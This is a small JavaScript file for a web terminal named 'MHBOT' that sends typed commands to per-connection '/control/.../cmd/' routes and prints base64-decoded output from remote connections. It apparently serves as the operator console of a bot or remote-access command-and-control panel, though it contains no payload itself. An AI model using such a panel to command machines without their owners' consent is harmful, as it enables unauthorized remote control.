$(document).ready(() => {
    let socket = io('http://127.0.0.1:3000');
    let senderId = $('#terminal').data('connection-id');
    let terminal = $('#terminal').terminal(function (cmd, term) {
        $.ajax({
            url: '/control/'+senderId+'/cmd/',
            data: {
                cmd: cmd
            },
            method: 'post'
        })
    }, {
        greetings: 'MHBOT',
        name: 'MHBOT',
        height: 600,
        prompt: '> '
    });

    socket.on('data', function (data) {
        let packet =JSON.parse(data);
        if(packet.sender_id === senderId){
            terminal.echo(atob(packet.data.output));
        }
    });
    socket.on('delete-connection', function(data){
        let packet =JSON.parse(data);
        if(packet.id === senderId){
            terminal.echo('Baglanti Koptu (' +senderId +')');
            terminal.pause();
        }
    });
});